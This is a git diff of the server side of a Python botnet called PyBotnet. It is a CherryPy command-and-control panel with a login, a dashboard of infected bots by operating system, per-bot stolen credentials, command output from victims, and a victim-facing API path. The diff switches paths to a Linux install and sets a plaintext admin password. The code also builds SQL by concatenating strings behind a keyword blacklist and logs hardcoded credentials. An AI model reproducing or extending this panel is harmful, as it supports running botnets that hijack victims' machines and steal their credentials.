@@ -6,6 +6,7 @@ from Crypto.Hash import SHA512,MD5
 import cherrypy 
 from jinja2 import Template
 import sqlite3
+from cherrypy.lib import sessions
 from cherrypy._cperror import HTTPRedirect
 
 #Variables
@@ -13,13 +14,13 @@ HOST = '127.0.0.1'
 PORT = 8080
 KEY = b'3b732d7aaaefb3d3b68be37f04292a1c' #AES_object.encrypt(base64.b64encode(b'Mik317@root')).hex()
 ADMIN = 'Mik317@root' #change the admin name
-PASS = base64.b64encode(AES.new(KEY, AES.MODE_CBC).encrypt(KEY).hex().encode()).decode()
+PASS = 'passowrd' #set a normal string
 PASS2 = 'Mik317@root'
-API = 'Insert your API Key for google maps' #generate it using this doc: https://developers.google.com/maps/documentation/embed/get-api-key
+API = 'https://www.google.com/maps/embed/v1/MODE-key=YOUR-API&parameters' #generate it using this doc: https://developers.google.com/maps/documentation/embed/get-api-key
 
 #HTML and dir variables
-PATH = 'C:\\Users\\MIKI\\workspace1\\PythonProject\\PyBotnet\\Server\\C&C\\' #change with your absolute path of the project
-PATH_V = 'C:\\Users\\MIKI\\workspace1\\PythonProject\\PyBotnet\\Server\\API\\' #path files where victim can call API
+PATH = '/root/PyBotnet/Server/C&C/' #change with your absolute path of the project
+PATH_V = '/root/PyBotnet/Server/API/' #path files where victim can call API
 
 SQL_EXP = ['SELECT', '\'', '"', ';', 'INSERT', 'DROP', 'TABLE', 'FROM', 'WHERE', 'SLEEP()', '#'] #possible sql expressions that can lead to sql inj
 
@@ -27,13 +28,13 @@ SQL_EXP = ['SELECT', '\'', '"', ';', 'INSERT', 'DROP', 'TABLE', 'FROM', 'WHERE',
 JSON_DEC = json.JSONDecoder()
 
 #DBs' Variables
-DB_PATH = "C:\\Users\\MIKI\\workspace1\\PythonProject\\PyBotnet\\Server\\DBs\\" #change the path
+DB_PATH = "/root/PyBotnet/Server/DBs/" #change the path
 
 cherrypy.config.update({'server.socket_host': HOST, 'server.socket_port': PORT})
 
 #Useful methods
 def get_credentials():
-    cherrypy.log("ADMIN: {0} & PASS: {1}".format(ADMIN,PASS))
+    cherrypy.log("ADMIN: {0} & PASS: {1}".format(ADMIN,PASS2))
     cherrypy.log("KEY: {0}".format(KEY.decode()))
     return ''
 
@@ -86,7 +87,7 @@ class Server(object):
         
     @cherrypy.expose
     def login(self):
-        html = open(PATH+'login.html','r').read()
+        html = open('/root/PyBotnet/Server/C&C/'+'login.html','r').read()
         template = Template(html)
         return template.render()
     
@@ -111,7 +112,7 @@ class Server(object):
     @cherrypy.tools.authenticate()
     @cherrypy.expose
     def dashboard(self):
-        html = open(PATH+'DashBoard\\dashboard.html','r').read()
+        html = open('/root/PyBotnet/Server/C&C/'+'DashBoard/dashboard.html','r').read()
         template = Template(html)
         db = bots_exec('SELECT DISTINCT * FROM Bots')
         win = int(bots_exec('SELECT COUNT(DISTINCT Key) FROM Bots WHERE Os = "Windows"')[0][0])
@@ -140,7 +141,7 @@ class Server(object):
     @cherrypy.tools.authenticate()
     def view_bot(self, id):  #id = user encoded = key
         id = anti_sql(str(id))
-        html = open(PATH+'DashBoard\\bots.html','r').read()
+        html = open('/root/PyBotnet/Server/C&C/'+'DashBoard/bots.html','r').read()
         template = Template(html)
         creds = ''
         if id == "all":
@@ -162,7 +163,7 @@ class Server(object):
     @cherrypy.expose
     @cherrypy.tools.authenticate()
     def cmd(self):
-        html = open(PATH+'DashBoard\\cmd.html','r').read()
+        html = open('/root/PyBotnet/Server/C&C/'+'DashBoard/cmd.html','r').read()
         template = Template(html) 
         db = cmds_exec('SELECT DISTINCT * FROM CmdsOut') 
         return template.render({'db':db})
@@ -179,7 +180,7 @@ class Server(object):
     @cherrypy.expose
     @cherrypy.tools.authenticate()
     def cmd_view(self, id):
-        html = open(PATH+'DashBoard\\cmd.html','r').read()
+        html = open('/root/PyBotnet/Server/C&C/'+'DashBoard/cmd.html','r').read()
         template = Template(html) 
         id = anti_sql(str(id))
         db = cmds_exec('SELECT DISTINCT * FROM CmdsOut WHERE Key="'+id+'"')
@@ -211,11 +212,11 @@ if __name__ == '__main__':
         conf = {
             '/':{
                 'tools.staticdir.on': True,
-                'tools.staticdir.dir': PATH,
+                'tools.staticdir.dir': '/root/PyBotnet/Server/C&C/',
                 'tools.staticdir.index': 'login.html',
                 'tools.sessions.on': True,
                 'tools.sessions.storage_class' :cherrypy.lib.sessions.FileSession,
-                'tools.sessions.storage_path' : PATH+"sessions\\",
+                'tools.sessions.storage_path' : "/root/PyBotnet/Server/C&C/Sessions/",
                 'log.screen' : True,
                 'tools.sessions.name': 'LoggedIn',
                 'tools.auth_basic.checkpassword': Server().verify_login,
